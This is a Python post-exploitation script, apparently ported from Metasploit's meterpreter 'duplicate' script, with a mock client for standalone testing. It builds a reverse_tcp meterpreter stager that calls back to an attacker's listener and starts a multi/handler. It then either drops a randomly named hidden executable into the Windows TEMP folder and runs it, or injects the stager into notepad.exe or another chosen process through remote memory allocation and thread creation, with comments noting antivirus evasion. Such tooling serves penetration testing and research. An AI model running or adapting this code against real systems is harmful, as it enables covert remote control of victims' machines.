#!/usr/bin/env python3

#
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
#

# Author: Scriptjunkie
# Python translation: Your Name/Handle
#
# Uses a meterpreter session to spawn a new meterpreter session in a different process.
# A new process allows the session to take "risky" actions that might get the process killed by
# A/V, giving a meterpreter session to another controller, or start a keylogger on another
# process.

import argparse
import os
import random
import string

# This script assumes a 'client' object is available, representing the Meterpreter session.
# All framework, sys, and fs calls are performed through this object.

# ================== Mock Client for Standalone Testing ==================
class MockPayload:
    def __init__(self):
        self.datastore = {}
    def generate(self):
        return b"\xde\xad\xbe\xef"

class MockModule:
    def __init__(self):
        self.datastore = {}
    def share_datastore(self, ds):
        self.datastore.update(ds)
    def exploit_simple(self, **kwargs):
        print(f"[+] Mock handler running with options: {kwargs}")

class MockFramework:
    def __init__(self):
        self.payloads = self
        self.exploits = self
    def create(self, name):
        print(f"[*] Creating module: {name}")
        if 'handler' in name:
            return MockModule()
        return MockPayload()

class MockProcess:
    def __init__(self, name="mock.exe", pid=1234):
        self._name = name
        self._pid = pid
    @property
    def name(self):
        return self._name
    @property
    def pid(self):
        return self._pid
    def get_processes(self):
        return [{'pid': 123, 'name': 'explorer.exe'}, {'pid': 456, 'name': 'notepad.exe'}]
    def open(self, pid=None, perms=None):
        print(f"[*] Opening process {pid or self.pid} with perms {perms}")
        return self # returns a mock process object
    def execute(self, path, args, opts):
        print(f"[*] Executing {path} with opts {opts}")
        return MockProcess(name=os.path.basename(path), pid=random.randint(1000, 9999))
    def __getitem__(self, key): # for client.sys.process['notepad.exe']
        if isinstance(key, str):
            for p in self.get_processes():
                if p['name'].lower() == key.lower():
                    return p['pid']
        return None
    @property
    def memory(self):
        return self
    @property
    def thread(self):
        return self
    def allocate(self, size):
        addr = random.randint(0x10000000, 0x7FFFFFFF)
        print(f"[*] Allocating {size} bytes at 0x{addr:x}")
        return addr
    def write(self, addr, data):
        print(f"[*] Writing {len(data)} bytes to 0x{addr:x}")
    def create(self, addr, args):
        print(f"[*] Creating thread at 0x{addr:x}")

class MockClient:
    def __init__(self):
        self.framework = MockFramework()
        self.platform = 'windows'
        self.workspace = 'default'
        self.sys = self
        self.process = MockProcess()
        self.config = self
        self.fs = self
        self.file = self
    def getenv(self, var):
        return "C:\\Windows\\Temp"
    def new(self, path, mode):
        return self
    def write(self, data):
        print(f"[*] Writing {len(data)} bytes to file.")
    def close(self):
        pass

# ================== Helper Functions ==================
def print_status(msg):
    print(f"[*] {msg}")

def print_error(msg):
    print(f"[-] {msg}")

def rand_text_alpha(length):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

# ================== Main Logic ==================
def main():
    parser = argparse.ArgumentParser(description="Spawn a new meterpreter session in a different process.")
    parser.add_argument("-r", "--rhost", help="The IP of a remote Metasploit listening for the connect back.")
    parser.add_argument("-p", "--rport", type=int, default=4546, help="The port on the remote host where Metasploit is listening (default: 4546).")
    parser.add_argument("-w", "--write-exe", action="store_true", help="Write and execute an exe instead of injecting into a process.")
    parser.add_argument("-e", "--executable", default="notepad.exe", help="Executable to inject into. Default: notepad.exe.")
    parser.add_argument("-P", "--pid", type=int, help="Process ID to inject into; use instead of -e.")
    parser.add_argument("-s", "--spawn", action="store_true", help="Spawn a new executable to inject into.")
    parser.add_argument("-D", "--disable-handler", action="store_true", help="Disable the automatic exploit/multi/handler.")

    args = parser.parse_args()

    # Determine LHOST
    rhost = args.rhost
    if not rhost:
        try:
            # This would be Rex::Socket.source_address("1.2.3.4") in Ruby
            rhost = client.sock.getsockname()[0]
        except:
            rhost = "127.0.0.1"

    print_status(f"Creating a reverse meterpreter stager: LHOST={rhost} LPORT={args.rport}")

    payload_name = "windows/meterpreter/reverse_tcp"
    pay = client.framework.payloads.create(payload_name)
    pay.datastore['LHOST'] = rhost
    pay.datastore['LPORT'] = args.rport

    if not args.disable_handler:
        mul = client.framework.exploits.create("multi/handler")
        mul.share_datastore(pay.datastore)
        mul.datastore['WORKSPACE'] = client.workspace
        mul.datastore['PAYLOAD'] = payload_name
        mul.datastore['EXITFUNC'] = 'process'
        mul.datastore['ExitOnSession'] = True
        print_status("Running payload handler")
        mul.exploit_simple(
            Payload=mul.datastore['PAYLOAD'],
            RunAsJob=True
        )

    if client.platform != 'windows':
        print_error("This version of Meterpreter is not supported with this Script!")
        return

    raw_payload = pay.generate()

    if args.write_exe:
        print_status("Generating meterpreter stager executable...")
        # In a real scenario, this would call a utility to create a PE file.
        # exe = Msf::Util::EXE.to_win32pe(client.framework, raw_payload)
        # We'll simulate this with the raw payload for this translation.
        exe = b"MZ" + raw_payload # Simplified stand-in

        tempdir = client.sys.config.getenv('TEMP')
        tempexe = os.path.join(tempdir, rand_text_alpha(random.randint(6, 14)) + ".exe")

        print_status(f"Uploading the agent to {tempexe}...")
        fd = client.fs.file.new(tempexe, "wb")
        fd.write(exe)
        fd.close

        print_status(f"Executing the agent...")
        client.sys.process.execute(tempexe, None, {'Hidden': True})
        print_status(f"Uploaded agent {tempexe} must be deleted manually.")
        return

    # --- Injection Logic ---
    target_pid = args.pid
    target_exe = args.executable

    if not target_pid:
        if args.spawn:
            print_status(f"Spawning a {target_exe} host process...")
            new_proc = client.sys.process.execute(target_exe, None, {'Hidden': True})
            target_pid = new_proc.pid
            if not target_pid:
                print_error(f"Could not create a process around {target_exe}")
                return
        else:
            print_status(f"Searching for process {target_exe}...")
            # This simulates client.sys.process[target]
            target_pid = client.sys.process[target_exe]
            if not target_pid:
                print_error(f"Could not find process {target_exe}, spawning notepad.exe as a fallback.")
                note = client.sys.process.execute('notepad.exe', None, {'Hidden': True})
                target_pid = note.pid

    if not target_pid:
        print_error("Could not determine a target process PID.")
        return

    try:
        print_status(f"Injecting meterpreter into process ID {target_pid}")
        # Assuming PROCESS_ALL_ACCESS is a known constant or not needed in the python binding
        host_process = client.sys.process.open(target_pid)
        mem = host_process.memory.allocate(len(raw_payload) + 1024)
        print_status(f"Allocated memory at address 0x{mem:x}, for {len(raw_payload)} byte stager")
        print_status("Writing the stager into memory...")
        host_process.memory.write(mem, raw_payload)
        host_process.thread.create(mem, 0)
        print_status(f"Successfully injected into process: {target_pid}")
    except Exception as e:
        print_error(f"Failed to inject into process {target_pid}: {e}")


if __name__ == "__main__":
    if 'client' not in globals():
        print_status("This script is intended to run in a Meterpreter session.")
        print_status("Initializing a mock client for testing purposes.")
        client = MockClient()
        # Example of how to simulate command-line arguments for testing:
        # import sys
        # sys.argv = ['duplicate.py', '-e', 'svchost.exe']
        main()
    else:
        main()